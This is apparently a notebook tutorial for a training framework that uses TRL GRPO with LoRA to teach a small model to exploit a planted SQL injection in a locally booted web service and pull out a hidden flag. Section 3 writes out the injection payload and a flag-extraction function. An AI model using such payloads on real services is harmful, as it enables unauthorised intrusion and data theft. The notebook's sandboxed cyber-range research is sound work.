# Train a model to exploit a live web service with TRL GRPO + LoRA

OpenRange admits **content-addressed** agent-training worlds. This notebook trains
a small model on the *cyber* pack: every rollout boots a **real HTTP server** with
a planted vulnerability, and the policy must **exploit it over the wire** and
exfiltrate a hidden flag — graded by the world itself, no static dataset of
"correct" attacks.

It is the same torch-free TRL seam that also trains file-editing agents, with a cyber **action surface**:
instead of file tools, the policy gets `http_get` and `submit`. The trainer adapter
is unchanged — `WebTargetEnv` just exposes different tools on the same lifecycle.

Runs on a laptop (MPS or CUDA). The point is the **mechanics and a reward you can
see is real** — §3 maps the whole reward surface *before* any GPU work.

For the simplest file-editing surface (a one-line bug fix), see
`trl_grpo_lora.ipynb`.

## 1. Install

```bash
uv pip install "openrange-trl[train]"   # torch, transformers, trl, datasets, accelerate, peft
```

`import openrange` never needs this extra — only the live training path below does.

## 2. Admit a cyber world

`admit` freezes a procedural cyber world into a **content-addressed snapshot**. We
pin `seed=0`: a deterministic world whose pentest entrypoint is a **SQL injection**
at `GET /svc/db/records`. Each world yields two tasks (`webapp.build`,
`webapp.pentest`); we train on the offensive one.

In [1]:
from cyber_webapp import WebappPack

from openrange.core.admit import AdmissionFailure, admit

pack = WebappPack()
snapshot = admit(
    pack,
    manifest={
        "world": {"goal": "recover the hidden flag"},
        "pack": {"id": "webapp"},
        "runtime": {"tick": {"mode": "off"}},
        "npc": [],
        "seed": 0,
    },
)
assert not isinstance(snapshot, AdmissionFailure), snapshot
snapshot.snapshot_id

'sha256:36581a76edc521016450462359734fc2fa9e3d16826f4ca23588ad4e0023b0e6'

## 3. See the reward before you train

The reward is the world's held-out verdict over the **HTTP path**. The pentest
family scores three subgoals — reach the endpoint, extract *something*, submit the
*right* flag — so `episode_reward` yields a four-rung surface. Driving
`WebTargetEnv`'s own tools by hand maps it: no model, no GPU, one fresh booted
server per call.

We read the exploit's coordinates (endpoint, injection param, the ground-truth
flag) from the world graph, then run a **real SQL injection** for the top rung.

In [2]:
import json
import re
from urllib.parse import urlencode

from openrange_trl import WebTargetEnv

from openrange.core.episode import EpisodeService

# Coordinates read from the world itself — no hardcoded secrets.
task = next(t for t in snapshot.tasks if t.meta.get("family") == "webapp.pentest")
entry = snapshot.graph.nodes[task.entrypoints[0]].attrs["public_url"]
truth = snapshot.graph.nodes[task.goal_nodes[0]].attrs["value_ref"]
param = next(
    v.attrs["params"]["target_param"]
    for v in snapshot.graph.by_kind("vulnerability")
    if v.attrs.get("kind") == "sql_injection"
)
payload = "' OR '1'='1"  # WHERE key = '' OR '1'='1'  -> dumps every row
exploit_path = f"{entry}?{urlencode({param: payload})}"


def exfiltrate(response):
    # A real attacker's step: pull the leaked secret out of the dumped rows.
    body = response.split(chr(10), 1)[-1]
    uuid = r"[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}"
    for row in json.loads(body).get("rows", []):
        for value in row.values():
            if re.fullmatch(uuid, str(value)):
                return str(value)
    return ""


def grade(name, actions):
    svc = EpisodeService(pack, f"or-runs/cyber/{name}")
    env = WebTargetEnv(service=svc, snapshots={snapshot.snapshot_id: snapshot})
    env.reset(snapshot_id=snapshot.snapshot_id, task_id=task.id)
    actions(env)
    env._finalize()
    print(f"{name:<22} reward={env.reward:.3f}  resolved={env.report.passed}")
    svc.close()


def reach(e):
    e.http_get(entry)


def wrong(e):
    e.http_get(entry)
    e.submit(json.dumps({"flag": "guess"}))


def exploit(e):
    dump = e.http_get(exploit_path)
    e.submit(json.dumps({"flag": exfiltrate(dump)}))


grade("no-op (no request)", lambda e: None)
grade("reach endpoint", reach)
grade("reach + wrong flag", wrong)
grade("exploit + submit", exploit)

no-op (no request)     reward=0.000  resolved=False
reach endpoint         reward=0.333  resolved=False
reach + wrong flag     reward=0.667  resolved=False


exploit + submit       reward=1.000  resolved=True


Four behaviors, four distinct grades:

| behavior | reward | why |
|------|--------|-----|
| no-op | **0.0** | no subgoal touched |
| reach endpoint | **0.333** | `reached_endpoint` only |
| reach + wrong flag | **0.667** | `+ extracted_anything`, but wrong |
| exploit + submit | **1.0** | SQLi exfiltrates the real flag → success |

That `0.0 → 1.0` ladder is the **spread GRPO turns into a gradient**. Training is
teaching the policy to find the *targeted* injection on its own. (This surface is
asserted live in `tests/test_trl_cyber.py`, so it can't silently drift.)

## 4. Wrap the world as a TRL environment

The torch-free adapter exposes the three seams TRL needs, with the web
action surface:

- **`build_grpo_dataset`** — the prompt rows (we keep the pentest task), tagged
  with `snapshot_id`. `WEB_TOOL_GUIDE` tells the policy how to use the HTTP tools.
- **`make_web_environment_factory`** — one `WebTargetEnv` per rollout: a fresh
  booted server exposing two **tools**, `http_get` and `submit`.
- **`make_reward_func`** — grades the final interaction with the held-out verdict.

In [3]:
from datasets import Dataset
from openrange_trl import (
    WEB_TOOL_GUIDE,
    build_grpo_dataset,
    make_reward_func,
    make_web_environment_factory,
)

rows = [
    row
    for row in build_grpo_dataset(snapshot, repeat=4, tool_guide=WEB_TOOL_GUIDE)
    if "pentest" in row["task_id"]
]
dataset = Dataset.from_list(rows)
environment_factory = make_web_environment_factory(
    pack, [snapshot], "or-runs/cyber/envs"
)
reward_func = make_reward_func()

## 5. Load the policy + a LoRA adapter

LoRA adapters on a small instruct model — the base stays frozen (fits a laptop),
GRPO updates only the low-rank adapters. Bump `model_name` to a larger instruct
model for rollouts strong enough to actually land the injection.

In [4]:
from peft import LoraConfig
from transformers import AutoModelForCausalLM, AutoTokenizer

model_name = "Qwen/Qwen2.5-0.5B-Instruct"
model = AutoModelForCausalLM.from_pretrained(model_name)
tokenizer = AutoTokenizer.from_pretrained(model_name)

lora = LoraConfig(
    r=16,
    lora_alpha=32,
    lora_dropout=0.0,
    target_modules=["q_proj", "k_proj", "v_proj", "o_proj"],
    task_type="CAUSAL_LM",
)

Loading weights:   0%|          | 0/290 [00:00<?, ?it/s]

Loading weights: 100%|██████████| 290/290 [00:00<00:00, 6304.61it/s]

## 6. Configure GRPO

Each step samples `num_generations` completions of the **same** prompt, grades
them, and turns their reward *spread* into advantages. `beta=0` drops the reference
model; `use_vllm=False` generates through transformers;
`max_tool_calling_iterations` bounds the recon→exploit→submit turns.

In [5]:
from trl import GRPOConfig

num_generations = 4
config = GRPOConfig(
    output_dir="or-runs/cyber/trainer",
    per_device_train_batch_size=num_generations,
    num_generations=num_generations,
    steps_per_generation=1,
    gradient_accumulation_steps=1,
    max_steps=1,
    learning_rate=1e-4,
    beta=0.0,
    temperature=1.0,
    max_completion_length=256,
    max_tool_calling_iterations=4,
    use_vllm=False,
    log_completions=False,
    logging_steps=1,
    report_to="none",
    disable_tqdm=True,
    save_strategy="no",
    bf16=False,
    fp16=False,
)

## 7. Train

`GRPOTrainer` discovers `WebTargetEnv`'s tool methods by reflection, runs the
multi-turn rollouts (each against its own booted server), reads `reward_func`, and
steps the LoRA adapters.

A 0.5B policy will usually **floor low** here — popping a SQL injection is much
harder than a one-line fix, so most rollouts only `reach` the endpoint (0.333). That
is the honest starting point, not a failure: §3 proved 1.0 is reachable, and the
gradient appears once a rollout diverges (a stronger model, higher temperature, more
samples).

In [6]:
from trl import GRPOTrainer

trainer = GRPOTrainer(
    model=model,
    reward_funcs=[reward_func],
    args=config,
    train_dataset=dataset,
    processing_class=tokenizer,
    environment_factory=environment_factory,
    peft_config=lora,
)
trainer.train()

{'loss': '0.03239', 'grad_norm': '882', 'learning_rate': '0.0001', 'num_tokens': '2432', 'completions/mean_length': '147', 'completions/min_length': '49', 'completions/max_length': '256', 'completions/clipped_ratio': '0.25', 'completions/mean_terminated_length': '110.7', 'completions/min_terminated_length': '49', 'completions/max_terminated_length': '198', 'tools/call_frequency': '0.75', 'tools/failure_frequency': '0', 'rewards/reward_func/mean': '0.1667', 'rewards/reward_func/std': '0.1925', 'reward': '0.1667', 'reward_std': '0.1925', 'frac_reward_zero_std': '0', 'entropy': '3.184', 'clip_ratio/low_mean': '0', 'clip_ratio/low_min': '0', 'clip_ratio/high_mean': '0', 'clip_ratio/high_max': '0', 'clip_ratio/region_mean': '0', 'step_time': '40.16', 'epoch': '0.25'}
{'train_runtime': '40.76', 'train_samples_per_second': '0.098', 'train_steps_per_second': '0.025', 'train_loss': '0.03239', 'epoch': '0.25'}


TrainOutput(global_step=1, training_loss=0.032385483384132385, metrics={'train_runtime': 40.7609, 'train_samples_per_second': 0.098, 'train_steps_per_second': 0.025, 'train_loss': 0.032385483384132385, 'epoch': 0.25})

## 8. Inspect the learning signal

The envs `GRPOTrainer` built hold the last batch's graded episodes. We read each
rollout's reward and whether it *resolved* the world, then export a
`snapshot_id`-tagged trajectory — the seam any downstream consumer (replay,
fine-tuning, analysis) reads.

In [7]:
from openrange_trl import env_trajectory

envs = list(trainer.environments or ())
rewards = [env.reward for env in envs]
resolved = sum(1 for env in envs if env.report is not None and env.report.passed)
spread = max(rewards) - min(rewards) if rewards else 0.0

print(f"rewards : {[round(r, 3) for r in rewards]}")
print(f"spread  : {spread:.3f}   (>0 => a real GRPO gradient)")
print(f"resolved: {resolved}/{len(envs)}")

trajectory = env_trajectory(envs[0])
print(f"world   : {trajectory.snapshot_id}")
print(f"turns   : {len(trajectory.steps)}   success: {trajectory.success}")

for env in envs:
    env.service.close()

rewards : [0.0, 0.333, 0.333, 0.0]
spread  : 0.333   (>0 => a real GRPO gradient)
resolved: 0/4
world   : sha256:36581a76edc521016450462359734fc2fa9e3d16826f4ca23588ad4e0023b0e6
turns   : 0   success: False


## Where this goes

You saw the reward is real (§3) and the loop runs end-to-end (§7–8). Two seams
carry it further:

- **Curriculum, in-place.** Unlike the SWE pack, the cyber pentest family ships
  graph mutations: when a round's reward spread collapses, `reward_variance_policy`
  fires `auto_evolve`, which mutates the world (harden / soften / diversify the
  planted vulnerabilities) and re-admits it — a new, harder snapshot to train on.
  The gym tracks the policy, live.
- **Provenance.** Every trajectory is tagged with the `snapshot_id`, so an evolved
  curriculum stays fully attributable.

The deterministic, torch-free seam and its reward-dynamics tests live in
the `openrange-trl` package + `tests/test_trl_cyber.py`, and the gated live
mechanics test is `tests/test_trl_live.py`. Honest scope: a laptop-scale model
won't actually pop the SQLi — the gradient is real and proven (§3), but mastery
needs GPU-scale compute.